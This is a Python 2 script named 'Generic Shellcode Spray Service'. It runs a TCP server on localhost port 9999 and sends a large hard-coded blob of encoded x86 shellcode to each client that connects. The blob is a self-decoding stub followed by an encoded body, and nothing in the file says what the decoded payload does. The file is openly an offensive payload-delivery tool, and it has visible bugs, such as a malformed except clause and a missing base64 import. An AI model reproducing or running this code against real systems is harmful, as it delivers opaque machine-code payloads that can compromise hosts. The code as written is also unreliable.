#!/usr/bin/python

#Generic Shellcode Spray Service

import os, time, sys, types, copy, cStringIO, threading
import socket, select, shutil, binascii
import string

LISTENON = "127.0.0.1"
PORT = 9999

SHELLCODE = "\xeb\x26\x5f\x8d\x77\x08\x89\xf2\x31\xc9\xb1\xd8\x31\xc0\xb0\x08\x0f\x6f\x07\x0f\x6f\x0e\x0f\xef\xc1\x0f\x7f\x06\x01\xc6\xe2\xf0\xeb\x13\xb0\x01\xb3\x05\xcd\x80\xe8\xd5\xff\xff\xff\xa4\xa5\xa9\xa2\xa1\xa5\xa7\xa3\xe4\xf5\xed\xed\xe6\xe2\x90\x94\xe4\xf5\xed\xed\xe6\xe2\x90\x94\xe4\xf5\xed\xed\xe6\xe2\x90\x94\xe4\xf5\xed\xed\xe6\xe2\x90\x94\xe4\xf5\xed\xed\xe6\xe2\x90\x94\x95\x65\x20\x61\x11\xa4\x14\xa6\x69\x25\x84\x8f\x8c\x88\x8a\xe1\xe1\xe2\xe0\xec\x81\xf7\xf4\xe2\x84\xf5\xfb\xeb\xf7\xe4\xf3\xe6\x84\xee\xec\xfb\x8c\x88\x8a\x8e\x89\xaf\xe4\xeb\xe8\xe0\xc8\xc4\xed\xe7\xe8\xe3\xea\xe6\xe6\xf2\xe1\xe4\xdb\xd6\xf3\xff\xde\xc9\x93\xd2\xf3\xcc\xc3\xd4\x9f\xc4\x91\x95\xdd\xda\xe7\x90\x90\xc5\xe5\xf7\x98\xf1\x90\xc7\xd4\xf7\xf4\xc6\xc0\xf8\x98\x96\xd5\xe5\xcd\xed\xf1\x91\xeb\xce\xc3\xe7\xef\xe9\xa3\xee\x96\xe1\xc8\xef\xc3\xf2\xcc\xe3\xc0\xea\xf7\xc6\xd0\x97\xe7\xca\xc7\xc1\xd3\x9b\xd5\xfc\xc8\xc1\xc5\xd0\xf0\xf5\xce\xef\xcf\xd6\xe9\xc9\xd6\xed\xdd\xd2\xf9\xd7\xe9\xef\xea\xe9\xde\xdf\xda\xd0\x90\x9c\xee\xfa\xe3\xc3\xcc\xe7\xe8\xeb\x94\xc7\x9c\xd6\x9c\xa8\xc8\xdc\xf2\xc0\xfd\x90\xde\x92\x92\xe7\xf6\x91\xea\xcd\x86\xc1\xcb\xf7\xf7\xd4\xf3\xe1\x99\xda\x8a\xf7\x95\x97\xc6\xea\xd1\xce\xe4\xd6\xcc\xc4\x9c\xed\xeb\xea\xeb\xc2\xf2\xf6\xe0\xf4\xf0\x94\xfb\xcc\xef\xd6\xe2\x8a\xfa\xf7\xf2\x95\xe1\xcd\x96\x94\xdd\xd5\xab\xea\xcb\x90\xf4\xe9\xcf\xf0\xd4\x95\xfd\xed\xd3\xf4\x9f\x9a\x99\x8a\xe8\xda\xc7\xe2\x91\xf6\xf4\x94\x96\xf5\xf5\xdc\xc5\xda\xf3\xf4\xcf\x8c\xdc\xd4\xec\xe1\xd4\xe7\xe3\xc4\x93\x9c\xeb\xf3\xcf\xd6\xe3\xeb\xd6\x95\x9c\x94\xcf\x97\xe4\xe5\x8b\xf0\xf3\xe8\xc3\xaf\xd3\xcb\xf2\x8e\xc7\xd8\xea\x95\xec\xe4\xf7\x9d\xda\xe0\xd0\x91\xcd\xc7\x9c\xd4\x99\xd6\xc2\xc8\xf6\xc6\xe2\xf5\xc4\x95\x97\xf6\xdd\xce\xd0\xe4\x82\xf2\xc3\x92\x92\xc0\xc9\x8e\xe0\xc7\xd5\xcf\x94\xfa\xee\x91\xfd\x9a\xcb\xcd\x9f\x90\x8b\xe4\xd8\xcb\xe2\xd0\xad\xda\xed\xf5\xd1\x9b\xe2\xd6\xfe\xd9\xe3\xf4\xcb\x89\xcd\xc9\xe0\xfa\xca\xea\xdb\xcd\xea\xc0\xea\xec\x91\xea\xe4\x9a\xe6\xd0\xec\xcf\xee\xc3\xcf\xe5\xf0\xec\xe3\xe2\xf5\xe4\xeb\xe3\xce\xec\xe5\xe2\xe7\xe1\xe1\xd1\xe0\x91\x90\xd5\xd0\xc1\x9a\xc6\xeb\xfd\xd2\xa9\xec\x8a\xf8\xd8\xf4\xd4\xcb\xe8\xf3\xc2\x9b\xc7\xc2\x90\xeb\xe4\xee\xd5\xe6\xcc\xf4\xd6\xcd\x9a\x94\xe2\xf8\xf4\xe5\xd6\xe4\x95\xd1\xf3\x9d\x91\xdb\xf3\xe3\xf7\xd2\xe8\xd0\xf0\x92\xc9\xf2\xd1\xea\xf3\x9a\xd2\xe3\xd7\xf5\x97\xc7\xed\xd3\xcd\xd3\x95\xc3\x95\xae\xee\xc7\xc7\xd2\xf1\xe3\x97\xe9\xe7\xe6\xc3\xf0\xcd\x90\xc1\xf0\xd1\xf0\x92\xd2\xf0\xe0\xfb\xe0\xe0\x82\xe3\xe4\xdd\xca\xe4\xd2\xd0\xfb\xd2\xc5\x97\xd1\xf7\xf7\xf3\xfb\xc0\xd4\xd6\xdd\xd7\xdd\xd3\xcc\xc7\x90\x94\xf1\xd2\x96\xed\xd8\xcb\xf6\x93\xc1\x91\xe7\xaf\xff\xfa\xe4\xd2\xf5\xf3\xde\xf4\xec\xeb\xc2\xf4\xc5\xef\xed\xe0\xcc\xed\x97\xd1\xc5\xc5\xc7\xf5\x9c\xee\x95\x96\xe9\xc6\xcd\xcd\x90\xe1\xe6\xdd\xc6\xcf\xcb\x90\xed\xc6\xd3\xeb\xf3\xce\xd2\x92\xdb\xcf\xe8\xf0\xf2\xfb\xe6\xca\xfa\xc5\xe6\xd2\xcb\xd5\xc6\xf6\xa3\xdb\xc3\xe2\x95\x9a\xe0\xea\xd8\xc7\xe5\x97\xdf\xd0\xea\xe2\x9d\xeb\xf6\xe1\xee\xe0\xf1\xee\xcf\xc5\x98\xca\xed\xe7\xd5\x95\xd1\xd8\xc5\xe3\xd7\xf1\x9c\xc3\x82\xfb\xf7\x91\xef\x91\xef\x8a\xc8\xf4\xe4\xce\xe5\xec\xd5\xe2\xdb\xc4\xd8\xf2\xc1\xd0\xe5\xd3\xf3\xa8\xe0\xf3\xe2\xe9\xc5\x94\xf9\x8d\xf1\xd0\xeb\xf7\xfc\xc4\x90\xdb\xd8\xe4\xe6\xcf\xf5\xfc\x9a\x9b\xfb\x97\xef\xd2\xc9\xf4\xea\xee\xd3\xc6\x88\xd6\xe5\x97\xd1\xd6\x93\xc1\xcf\xd4\xef\xd1\xc0\xc5\xf6\xd6\xd0\xc4\xc0\xd0\x9d\xce\xc0\xe1\xc9\xf7\x8f\xcb\xcf\x91\xab\x93\xed\x88\xca\xe4\xe8\xe7\xe2\xc2\xfe\xe6\xe5\x94\x9e\xee\xc4\xc4\xce\xc1\xe1\xee\x98\xf3\x99\x9d\xf5\xcb\x96\xf2\xcd\xc3\xd2\xd5\xc8\xe8\xed\x8a\xe6\xe7\xf4\xc4\xdd\x92\xef\xdf\xe8\xcb\x91\xe8\x93\x94\xc6\xe8\xc1\xd4\xeb\xf4\xd0\xce\xe5\xdf\xe7\x92\x94\xaf\xdd\x9b\xd1\x95\xee\xf4\x95\xe2\xc3\xf3\xd0\x90\xcb\xe3\xc9\xe4\xca\xd4\xe2\xe7\xde\xea\xcd\xcb\xde\xeb\xc1\xc8\xc6\xe9\xd3\x93\xca\xcb\xdc\xe4\xc6\x93\xe4\xc3\xe3\xef\xd5\xce\xcd\xec\xd5\xcc\x93\xc1\xd0\x9d\xdf\xd4\xf2\xf1\xe3\xd6\xe8\x95\xc5\x90\xc2\xe0\xad\xf0\xcb\xd3\xcb\x9a\x95\x95\x92\xfb\xeb\xd7\xe1\xc6\xf7\xed\x8c\x8c\xd0\xd6\xc7\xf8\xed\xc9\xc9\xc4\xd7\x8a\xcf\x91\xd5\xc3\x90\xd5\xdd\xe6\x9a\x89\xcc\xc0\x96\xe6\x9c\xd4\xe5\xc7\xd9\xd2\xe1\xee\xfd\xee\xfd\xeb\xf6\xce\xe4\xc4\xfd\xe0\xe8\xd8\x92\x93\xc8\xa9\xc6\xee\xdb\xf0\xf8\x90\xd2\xcf\xf1\xd4\xfa\xef\xee\xd5\xe3\xee\xd0\xec\xf3\xf4\xef\xdc\xe1\x9b\xcc\x97\xfd\xf1\xe0\xf0\xf3\xe9\xc7\xe0\xf1\xd0\x98\xf3\xf7\xf7\x95\xcc\xfa\xe1\xc5\xd2\xf4\xd2\xca\xe9\xfd\x90\xf3\x90\xee\xf6\xe1\xe3\xfb\xc8\xee\xcc\xc1\x96\xae\x97\x99\x97\xf8\xcf\xf5\x94\x8b\xff\xee\x94\xec\x8e\xe3\xe5\xc8\xfd\xcb\xf7\xd3\xdc\xff\xe9\xe7\xe3\xfa\xd4\xd5\xd3\xee\xef\xf3\xe3\xf0\xc5\xea\xc9\xf0\xc6\xe5\x96\xc8\xe8\xdb\xdf\xd6\xd5\xcf\xcb\xec\xeb\xea\xc0\x90\xe6\x8b\xd3\xcb\xc1\xe5\xe0\xf5\xda\xde\xaf\xf0\x93\xce\xc1\xc2\x92\xcc\xcb\xcd\xeb\xf6\xce\xec\x96\x90\xcd\xd0\xce\xf3\x8a\xc8\xec\xd7\xe2\xe8\xf0\x8e\xe2\x8c\xd6\xcb\xe0\xff\xc7\xcc\xdd\xc6\xc9\xe1\xe6\xce\xfb\xe3\xf3\xe6\xcd\xde\xc3\x9e\xd8\xcd\xc3\xeb\xc8\xd6\x93\xf3\xc8\x97\x97\xd3\x97\xec\xe7\xa3\x89\xc8\x90\xe9\xea\x9d\xf4\xdd\xf7\x96\xe2\x94\x95\xce\xef\xed\xeb\x97\xc9\xe1\x8c\xf3\xc1\x9e\x92\xf5\xed\x88\xe0\x92\x94\xdc\xec\xf0\xf3\xc4\x8c\xc3\x93\xc3\xc3\xcb\xdf\x94\xc8\x8f\xf0\xe2\xc1\xc9\xd1\xc4\x96\xf0\xd2\x82\x94\xef\xe0\x96\x8c\x94\xdf\xf1\xa8\xe4\xc2\x96\xd9\xcf\xe3\xf8\xca\xc0\xdc\xc9\xeb\xc9\xed\xe7\xea\xed\xc0\xed\xe7\xf0\xe7\xcb\xd6\xf3\xc2\xd3\xe9\x91\xe2\xe5\xd4\xca\xc8\xe1\x93\xc3\xd5\xe4\x94\xe2\xef\xc9\xcf\xd4\xcd\xfb\xed\xca\x95\xc5\xc2\xf0\xd4\xdf\x94\xe3\xf1\x96\xcb\xe1\xf3\xfb\x97\xab\xcd\xcc\xc2\xc7\xed\xe6\xf4\xcb\x95\xe0\x94\xc5\xc7\xfd\xc7\xd0\xdd\xec\xe0\xe7\xe6\xf8\xe9\xe3\xc2\xe2\xee\x90\x94\xf1\xc4\xc7\xed\x96\xc0\xf2\x90\xca\xcf\xf0\xff\xfd\x90\xf0\xd4\x9a\x96\xf0\xdd\xde\xd1\xe2\xf5\xc6\xee\xc4\xd1\xd2\xd2\xf7\xf1\xc7\xe1\xe3\xaf\xe9\xd2\xe7\xf0\xe7\x9b\xdb\x91\xcb\xd4\xd2\xfc\xeb\xdb\x95\xc1\xd4\xce\xd3\xc1\xcd\x92\xea\xf1\xe1\xe5\xef\xf1\xe8\xed\x98\x92\xd0\xcf\xf6\x94\x9c\xcf\xc4\xdf\xec\xf1\xcc\x8a\xc8\xe7\xc4\xcf\xca\xc9\xd2\x90\xe6\xe7\x8a\xe1\xca\x9a\xe3\xc8\x99\xf8\xf5\xec\xad\xef\xcd\xf2\xf3\xe7\xd3\xc4\x90\xe4\xd5\xc8\xd8\xe8\xd3\xfc\x93\x94\xd3\xdc\xed\xd1\xe3\xe9\xf0\xf9\x93\xc3\xd3\xca\xe6\xd5\x90\xcf\x97\xe2\xe6\xc5\xcf\xfd\xe9\xcf\xcc\xef\xe5\xc7\xec\xc6\xe3\x88\xf6\xf0\x9c\xe6\xd6\xcf\xd2\xee\xd4\xcc\x9a\xcf\xe0\x8a\x9e\xa9\xf2\xc0\x99\xe0\xe0\xca\xe0\xe2\xee\x92\xd0\xfb\xc7\xdf\xff\xd3\x94\xf6\xc6\xd3\xf2\xdf\xf0\xe6\xf3\xec\xdb\x92\xc7\xd4\xe4\xd7\xe6\xd7\xc5\xe0\xc5\xc7\xf4\x96\xf5\xe6\xef\x90\xe7\xc4\xc9\xcc\xee\xf5\xc4\xc5\xe9\xf1\xfd\xe4\xdc\xcf\xec\xc8\xd6\xd5\xcb\xe6\xae\xc8\xed\xcc\xcd\xf2\xec\xc1\xca\xf3\xd8\x89\x98\xd5\xff\xce\xdc\xc7\xcf\xe7\xf3\xe2\xde\xcc\xde\xfc\xf3\xef\xea\xd1\xf2\x95\xc1\x9c\xef\xec\xc5\xd6\xcf\xcd\xf4\x8a\x9a\xc0\x8a\xee\xe2\xd0\xe0\xc7\x99\xcd\xed\x90\xe2\xf7\xe7\xef\xcd\xf1\xef\xf0\xcf\xe4\xcb\xaf\xc6\xd7\xc8\xf5\xfd\xec\xfe\x93\x9d\x91\xd0\xd5\x94\x95\xd5\x95\xed\xe7\xe5\x97\xc6\xd9\x8b\xe8\x98\x93\x8a\xdd\x9f\xe7\xea\x9c\xf3\x92\x93\xce\xe4\xd0\xf6\xd1\xfd\xf3\xc3\xe0\xd7\xed\xc2\xc9\xcd\xcf\xe0\x98\xad\x8e\x89\x88\x84\x8f\xe4\xeb\xe3\x83\xf6\xf6\xe8\x82\xf1\xf7\xee\xf5\xe5\xf1\xec\x82\xea\xe0\xfe\x8e\x89\x88\x84\x8f\x31\x35\x37\x33"

HEXIFY = False   #Hexify encode the shellcode? - Not implemented
DELIMIT = False  #Delimit the hexified - Not implemented
DELIMITER =""    #If delimiting then use this - Not implemented
ENCRYPT = False  #Run the encrypt function before sending? - Not Implemented



WAIT = 1


def slicen(s, n, truncate=False):
	    assert n > 0
	    while len(s) >= n:
		yield s[:n]
		s = s[n:]
	    if len(s) and not truncate:
	        yield s


def hexdelimit(string):
	outstring = ""
        hexstring = binascii.b2a_hex(string)
	for byte in slicen(hexstring, 2):
		outstring += "\\x" + byte
	return outstring
	
def encrypt(plain, key=""):
	return base64.b64encode(plain)


		  



class Server:
    def process_request_Thread(self, request, client_address):
        try:
            
	    print "\n+++ GOT CONNECT FROM: " + client_address[0]	
            time.sleep(WAIT)
	    request.send(SHELLCODE)   
	    time.sleep(WAIT)
	    request.close
	    print "--- SENT " + str(len(SHELLCODE)) + " BYTES TO : " + client_address[0]	
	except Exception.x:
	    print "Error during connect: %s" % x 
    
    def handle_request(self):
        # Handle one request, possibly blocking.
        try:
            request, client_address = self.socket.accept()
        except socket.error:
            return
        try:
            t = threading.Thread(target = self.process_request_Thread, args = (request, client_address))
            t.setDaemon(False)
            t.start()
           

        except:
            try:
                request.shutdown(2)    
                request.close()

            except Exception,x:
                print "Error during closing of connection: %s" % x

  

    def serve_forever(self):


        self.socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.socket.bind((LISTENON, PORT))
        self.socket.listen(100)     # start listening on the socket
        self.mustShutdown=False
        

        previousReap=time.time()
        while not self.mustShutdown:
            ins,outs,excs=select.select([self],[],[self],10)    # 10 second timeout
            if self in ins:
                self.handle_request()

        

    def fileno(self):
	    # interface required for select system call

        return self.socket.fileno()


Server().serve_forever()
